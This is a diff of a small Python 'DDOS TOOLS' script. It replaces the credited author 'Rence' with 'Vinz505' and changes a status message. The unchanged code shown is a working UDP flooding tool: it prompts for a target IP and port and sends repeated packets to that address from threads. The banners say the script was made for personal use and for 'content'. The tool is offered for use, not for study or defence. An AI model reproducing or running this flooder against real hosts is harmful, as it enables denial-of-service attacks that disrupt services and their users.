@@ -1,14 +1,14 @@
 #!/usr/bin/env python3
-#Code by Rence
+#Code by Vinz505
 import random
 import socket
 import threading
 
-print("~~~ DDOS TOOLS By Rence ~~~")
-print("~~~ Code and Scripted by Rence ~~~")
-print("~~~ Script ini dibuat hanya untuk rence Pribadi. ~~~")
-print("~~~ Don't Forget to subscribe Ren Samp ~~~")
-print("~~~ DDOS by rence dibuat hanya untuk kontent. ~~~")
+print("~~~ DDOS TOOLS By Vinz505 ~~~")
+print("~~~ Code and Scripted by Vinz505 ~~~")
+print("~~~ Script ini dibuat hanya untuk Vinz505 Pribadi. ~~~")
+print("~~~ Don't Forget to subscribe Vinz505 ~~~")
+print("~~~ DDOS by Vinz505 dibuat hanya untuk kontent. ~~~")
 ip = str(input(" Target Ip:"))
 port = int(input(" Target Port:"))
 choice = str(input(" UDP(y/n):"))
@@ -23,7 +23,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" Sent!!!")
+			print(i +" TOK TOK PAKETT!!!")
 		except:
 			print("[!] Error!!!")
 
